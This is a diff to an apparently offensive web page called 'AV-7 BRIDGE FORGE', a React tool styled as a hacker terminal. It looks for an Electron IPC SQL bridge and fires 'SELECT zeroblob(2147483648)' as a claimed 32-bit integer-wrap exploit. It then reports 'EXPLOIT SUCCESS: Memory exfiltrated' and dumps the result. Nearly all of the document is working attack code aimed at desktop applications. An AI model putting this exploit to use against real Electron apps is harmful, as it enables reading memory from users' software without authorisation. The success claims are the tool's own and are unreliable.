@@ -10,8 +10,8 @@
         body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
         .terminal { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
         button { background: #00ff41; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        button:hover { background: #fff; }
-        pre { background: #111; padding: 10px; border-left: 3px solid #00ff41; overflow-x: auto; white-space: pre-wrap; }
+        button:disabled { background: #333; color: #666; cursor: not-allowed; }
+        pre { background: #111; padding: 10px; border-left: 3px solid #00ff41; overflow-x: auto; white-space: pre-wrap; font-size: 12px; }
     </style>
 </head>
 <body>
@@ -22,26 +22,24 @@
             const [logs, setLogs] = React.useState([]);
             const [dump, setDump] = React.useState("");
 
+            // Detect bridge
+            const bridge = window.api?.executeSql || window.electron?.dbQuery;
+
             const addLog = (m) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${m}`, ...prev]);
 
             const runForge = async () => {
                 addLog("Scanning for IPC Bridge...");
                 
-                // Target common Electron Bridge namespaces
-                const bridge = window.api?.executeSql || window.electron?.dbQuery;
-
                 if (!bridge) {
-                    addLog("CRITICAL: No Bridge found. (Are you in a standard browser?)");
+                    addLog("CRITICAL: No Bridge found.");
                     return;
                 }
 
                 addLog("Bridge Active. Firing 32-bit Integer Wrap (2^31)...");
 
                 try {
-                    // The AV-7 Forge: Tell C++ it's 2GB, but send 1 byte.
                     const result = await bridge("SELECT zeroblob(2147483648) AS leak");
-                    
-                    addLog("EXPLOIT SUCCESS: Main Process memory exfiltrated.");
+                    addLog("EXPLOIT SUCCESS: Memory exfiltrated.");
                     setDump(JSON.stringify(result, null, 2));
                 } catch (e) {
                     addLog(`FAIL: Bridge rejected payload. Reason: ${e.message}`);
@@ -51,6 +49,7 @@
             return (
                 <div className="terminal">
                     <h1 style={{color: '#fff', textShadow: '0 0 10px #00ff41'}}>AV-7 BRIDGE FORGE</h1>
+                    
                     <div style={{display: 'flex', gap: '10px', marginBottom: '20px'}}>
                         <div style={{border: '1px solid #333', padding: '10px', flex: 1}}>
                             <small>ENGINE STATUS</small>
@@ -64,12 +63,13 @@
                         </div>
                     </div>
                     
-                    <button onClick={runForge} disabled={!window.api && !window.electron}>
-                        { (!window.api && !window.electron) ? "WAITING FOR TARGET..." : "EXECUTE FORGE" }
+                    <button onClick={runForge} disabled={!bridge}>
+                        { !bridge ? "WAITING FOR TARGET..." : "EXECUTE FORGE" }
                     </button>
             
                     <h3>Real-time Logs:</h3>
-                    <div style={{height: '100px', overflowY: 'auto', background: '#050505', padding: '10px', fontSize: '12px'}}>
+                    <div style={{height: '120px', overflowY: 'auto', background: '#050505', padding: '10px', fontSize: '12px', border: '1px solid #222'}}>
+                        {logs.length === 0 && <div>System idle. Waiting for IPC...</div>}
                         {logs.map((l, i) => <div key={i} style={{opacity: i === 0 ? 1 : 0.5}}>{l}</div>)}
                     </div>
             
@@ -82,7 +82,7 @@
                 </div>
             );
         }
-        
+
         const root = ReactDOM.createRoot(document.getElementById('root'));
         root.render(<App />);
     </script>
